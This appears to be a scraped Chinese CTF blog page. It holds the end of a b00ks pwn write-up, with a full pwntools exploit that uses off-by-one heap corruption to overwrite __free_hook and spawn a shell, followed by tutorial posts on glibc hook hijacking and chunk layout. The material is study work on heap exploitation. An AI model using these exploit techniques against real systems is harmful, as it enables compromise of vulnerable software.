<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">4</span>]: <span class="number">0x7ff6d3e13000</span>-<span class="number">0x7ff6d3df1010</span></span><br><span class="line">Out[<span class="number">4</span>]: <span class="number">139248</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: <span class="built_in">hex</span>(<span class="number">139248</span>)</span><br><span class="line">Out[<span class="number">5</span>]: <span class="string">&#x27;0x21ff0&#x27;</span></span><br></pre></td></tr></table></figure>
<p>两者的差值是一个常数（不同的libc文件偏移不同，甚至可能是负数，需要用GDB看）</p>
<p>那么“libc_base”就可以被计算出来，就可以用“free_hook”来get shell了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libc_base = bookname2 + <span class="number">0x21ff0</span> </span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#one_gadget = libc_base + 0xe6c81</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&#x27;system &gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>, p64(bin_sh) + p64(free_hook))</span><br><span class="line">change(<span class="number">2</span>, p64(system))</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>编辑“list_1_description”，实际上写入了“list_2”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55c18a470400</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4704c8</span>	<span class="comment">#fake_list</span></span><br><span class="line"><span class="number">0x55c18a470410</span>:	<span class="number">0x000055c18a4704c8</span>	<span class="number">0x0000000000001000</span>  <span class="comment">#fake_description(list_2)</span></span><br><span class="line"><span class="number">0x55c18a470420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span>	</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55c18a4704c0</span>:	<span class="number">0x0000000000000002</span>	addr(<span class="string">&quot;/bin/sh&quot;</span>)		<span class="comment">#list_2</span></span><br><span class="line"><span class="number">0x55c18a4704d0</span>:	addr(free_hook)		<span class="number">0x0000000000021000</span></span><br><span class="line"><span class="number">0x55c18a4704e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001fb21</span></span><br></pre></td></tr></table></figure>
<p>编辑“list_2_description”，在“free_hook”中写入“system”</p>
<p>执行“free(2)”时，就会执行“free_hook”挂钩的函数“system”</p>
<p><img src="/2022/01/10/free_hook+off-by-one/Users/ywx813/Desktop/HeapAttack/free_hook+off-by-one/wp/1641487724350.png" alt="1641487724350"> </p>
<p>而“list_2”的“list_addr + 8”中被写入了”/bin/sh”，这里就相当于执行了“ system(“/bin/sh”) ”</p>
<p>当然用“one_gadget”也可以：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libc_base = bookname2 + <span class="number">0x21ff0</span> </span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xe6c81</span></span><br><span class="line"><span class="comment">#system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#bin_sh = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">success(<span class="string">&#x27;one_gadget &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>, p64(<span class="number">0</span>) + p64(free_hook))</span><br><span class="line">change(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">len_book,bookname,len_description,description</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter book name size: &#x27;</span>,<span class="built_in">str</span>(len_book))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;(Max 32 chars): &#x27;</span>,bookname)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;description size: &#x27;</span>,<span class="built_in">str</span>(len_description))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;description: &#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;delete: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,description</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;want to edit: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;book description: &#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span>(<span class="params">name</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, name)	</span><br><span class="line">	</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xe0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">list1_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">list2_addr=list1_addr+<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;list1_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(list1_addr))</span><br><span class="line">success(<span class="string">&quot;list2_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(list2_addr))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&#x27;cccc&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">1</span>) + p64(list2_addr + <span class="number">8</span>) * <span class="number">2</span> + p64(<span class="number">0x1000</span>)</span><br><span class="line">change(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">change_name(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">bookname2 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;bookname2 &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(bookname2))</span><br><span class="line"></span><br><span class="line">libc_base = bookname2 + <span class="number">0x21ff0</span> </span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xe6c81</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&#x27;system &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>, p64(bin_sh) + p64(free_hook))</span><br><span class="line">pause()</span><br><span class="line">change(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] list1_addr &gt;&gt; <span class="number">0x563929e21490</span></span><br><span class="line">[+] list2_addr &gt;&gt; <span class="number">0x563929e214c0</span></span><br><span class="line">[+] bookname2 &gt;&gt; <span class="number">0x7fc022a21010</span></span><br><span class="line">[+] libc_base &gt;&gt; <span class="number">0x7fc022a43000</span></span><br><span class="line">[+] system &gt;&gt; <span class="number">0x7fc022a98410</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>PS：</strong></p>
<p>本程序服务器的libc版本为“libc-2.23.so”可以利用这种方式来打</p>
<p>但“libc-2.29.so”以后假如了两行代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>如果“list_2”的“presize”不等于“list_1”的“size”，程序就会报错</p>
<p>导致以下代码没法执行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">change(<span class="number">1</span>, p64(bin_sh) + p64(free_hook)) <span class="comment">#这个&#x27;list_1&#x27;是伪造的</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Ahook%E5%8A%AB%E6%8C%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Ahook%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">Ptmalloc算法：hook劫持</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-10 15:49:39" itemprop="dateCreated datePublished" datetime="2022-01-10T15:49:39+08:00">2022-01-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-11 16:22:50" itemprop="dateModified" datetime="2022-01-11T16:22:50+08:00">2022-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Ptmalloc算法：hook劫持"><a href="#Ptmalloc算法：hook劫持" class="headerlink" title="Ptmalloc算法：hook劫持"></a>Ptmalloc算法：hook劫持</h2><p>利用hook机制，把某个函数的hook劫持为shellcode</p>
<p>这种技术在堆利用中很常见，想要了解它，必须先了解<strong>hook机制</strong></p>
<hr>
<h2 id="钩子hook"><a href="#钩子hook" class="headerlink" title="钩子hook"></a>钩子hook</h2><p>hook直意为钩子又叫做<strong>回调函数</strong>，是一种特殊的消息处理机制，它可以监视系统或者进程中的各种事件消息，截获发往目标窗口的消息并进行处理</p>
<p>在程序中设置钩子，用来在 <strong>malloc</strong> ， <strong>realloc</strong> ， <strong>free</strong> 的时候，对其进行检查，可以看到对应的函数调用后的地址是什么</p>
<p><strong>原理：</strong></p>
<p>hook本质上就是一个函数指针，可以指向不同的函数，从而完成不同的功能</p>
<p><strong>设计理念：</strong></p>
<p>我们在写main函数的时候，可能还不知道它会完成什么功能，这时候留下函数指针作为接口，可以挂上不同的函数完成不同的功能，究竟执行什么功能由钩子函数的编写者完成，钩子的出现体系了程序模块化的思想</p>
<p><strong>案例：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun1</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i am fun1\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun2</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i am fun2\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> (* fun)(<span class="keyword">void</span>); <span class="comment">//定义一个函数指针</span></span><br><span class="line">  </span><br><span class="line">    fun = fun1;		<span class="comment">// 让fun指向fun1（首地址）</span></span><br><span class="line">    fun();			<span class="comment">// 执行fun</span></span><br><span class="line">    </span><br><span class="line">    fun = fun2;   	<span class="comment">// 让fun指向fun2（首地址）</span></span><br><span class="line">    fun(); 			<span class="comment">// 执行fun</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./test</span><br><span class="line">i am fun1</span><br><span class="line">i am fun2</span><br></pre></td></tr></table></figure>
<p>这里的函数“fun1”和函数“fun2”就是hook把函数指针fun指向fun1和fun2的过程称为“挂钩子”</p>
<h2 id="libc中的hook"><a href="#libc中的hook" class="headerlink" title="libc中的hook"></a>libc中的hook</h2><p>libc中最常见，也是堆利用中最常见的两种hook：malloc_hook，free_hook</p>
<p>接下来以“malloc_hook”为例，分析一下hook的具体实现：</p>
<p>ptmalloc 定义了一个<strong>全局钩子 malloc_hook</strong>，这个钩子会被赋值为 <strong>malloc_hook_ini</strong> 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">weak_variable</span> <span class="params">(*__malloc_hook)</span></span></span><br><span class="line"><span class="function">    <span class="params">(<span class="keyword">size_t</span> __size, <span class="keyword">const</span> <span class="keyword">void</span> *)</span> </span>= malloc_hook_ini;</span><br></pre></td></tr></table></figure>
<p>而函数malloc会调用 malloc_hook ，那么在 <strong>第一次调用malloc函数</strong> 时会执行 malloc_hook，也就是执行了 <strong>malloc_hook_ini</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">malloc_hook_ini</span> <span class="params">(<span class="keyword">size_t</span> sz, <span class="keyword">const</span> <span class="keyword">void</span> *caller)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __malloc_hook = <span class="literal">NULL</span>;</span><br><span class="line">  ptmalloc_init ();</span><br><span class="line">  <span class="keyword">return</span> __libc_malloc (sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见在 malloc_hook_ini 会把 malloc_hook <strong>置空</strong>，然后调用 <strong>ptmalloc_init</strong> 函数，完成对 ptmalloc 的初始化，最后再次调用 malloc_hook，但是这次的 malloc_hook 已经置空，从而继续执行剩下的代码</p>
<p>第一次调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(__libc_malloc) -&gt; __malloc_hook(malloc_hook_ini) -&gt; ptmalloc_init -&gt; __libc_malloc -&gt; _int_malloc</span><br></pre></td></tr></table></figure>
<p>再次调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(__libc_malloc) -&gt; _int_malloc</span><br></pre></td></tr></table></figure>
<ul>
<li>malloc_hook_ini：对malloc_hook进行初始化的函数，代码已给出</li>
<li>ptmalloc_init：对整个ptmalloc框架进行初始化的函数，以后分析</li>
<li>__libc_malloc：用于初始化malloc，以后分析</li>
<li>_int_malloc：用于内存分配的函数，是ptmalloc的核心点，以后分析</li>
</ul>
<p>最后，malloc_hook会指向一个“检查函数”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">function</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">void</span> * caller)</span></span></span><br></pre></td></tr></table></figure>
<p>caller：表示用malloc申请空间的“可写入地址”（ fd&amp;bk 所在处）</p>
<p>使用malloc的时候就可以返回其“可写入地址”了</p>
<h2 id="hook劫持"><a href="#hook劫持" class="headerlink" title="hook劫持"></a>hook劫持</h2><p>hook劫持的基本操作就是：在hook的地址中写入shellcode的地址，可以把hook地址写在<strong>某个固定地址上</strong>，然后在这个地址中写入shellcode，这样就挂钩完毕了</p>
<p>那么问题的关键就是找hook的地址：</p>
<p>一，如果知道libc版本，可以直接引入libc库，用ELF工具进行查找</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>这种方法需要泄露libc基地址</p>
<p>二，还可以用“main_arena”来定位“malloc_hook”</p>
<p>malloc_hook位于main_arena上方16字节</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Ahook%E5%8A%AB%E6%8C%81/1639154237609.png" class width="1639154237609"> 
<p>当small chunk被释放时，它的fd、bk指向一个指针，这个指针指向top chunk地址，这个指针保存在<strong>“main_arena+0x58”</strong></p>
<p>找到合适的small chunk再free掉，然后通过“main_arena”获取“malloc_hook”</p>
<p>​        // 等到分析 Unsortedbin attack 的时候，再分析这种hook劫持技术</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/" class="post-title-link" itemprop="url">Ptmalloc算法：off-by-one</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-10 15:49:35" itemprop="dateCreated datePublished" datetime="2022-01-10T15:49:35+08:00">2022-01-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-08-11 14:22:24" itemprop="dateModified" datetime="2022-08-11T14:22:24+08:00">2022-08-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Ptmalloc算法：off-by-one"><a href="#Ptmalloc算法：off-by-one" class="headerlink" title="Ptmalloc算法：off-by-one"></a>Ptmalloc算法：off-by-one</h2><p>在堆溢出的基础上，只溢出1字节，这就是<strong>off-by-one</strong></p>
<p>想了解这个漏洞必须先了解 <strong>chunk</strong> 的结构 </p>
<hr>
<h2 id="数据结构chunk"><a href="#数据结构chunk" class="headerlink" title="数据结构chunk"></a>数据结构chunk</h2><p><strong>什么是chunk？</strong>用户申请的内存空间就被称为chunk</p>
<p>在ptmalloc算法中，用户申请的内存空间以chunk为单位进行管理，它的结构入下图：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>一共有6个部分，其中最后两个部分是 <strong>large chunk</strong> 特有的</p>
<ul>
<li>prev_size：相邻的前一个堆块大小（该字段不计入当前堆块的大小计算，free状态时：数据为前一个chunk的大小，allocate状态时：用于前一个chunk写入数据）</li>
<li>size：本堆块的长度（长度计算方式：<strong>size字段长度+用户申请的长度+对齐</strong>，最后3位标志位）</li>
<li>fd&amp;bk：双向指针，用于组成一个双向空闲链表</li>
<li>fd_nextsize：指向前一个与当前 chunk 大小不同的第一个空闲块 </li>
